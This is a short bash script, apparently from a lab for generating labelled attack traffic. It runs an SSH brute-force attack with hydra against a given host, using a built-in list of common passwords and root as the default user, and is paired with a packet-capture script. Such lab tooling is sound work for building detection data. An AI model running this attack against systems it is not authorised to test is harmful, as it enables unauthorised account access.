#!/usr/bin/env bash
# lab/attacks/ssh-brute.sh — SSH brute force.  Label: Brute Force -SSH
# RUN FROM THE ATTACKER HOST, only against hosts you own. Pair with:
#   sudo bash lab/capture.sh --label "Brute Force -SSH" --duration 120 --attacker-ip <this host>
set -euo pipefail
TARGET="${1:?usage: ssh-brute.sh <host> [user]}"
USER="${2:-root}"
command -v hydra >/dev/null || { echo "need hydra"; exit 1; }
WL=$(mktemp)
printf 'password\n123456\nadmin\nletmein\nroot\ntoor\nqwerty\nchangeme\n' > "$WL"
echo "ssh brute $USER@$TARGET ..."
hydra -l "$USER" -P "$WL" -t 4 -f "ssh://$TARGET" || true
rm -f "$WL"
echo "done."
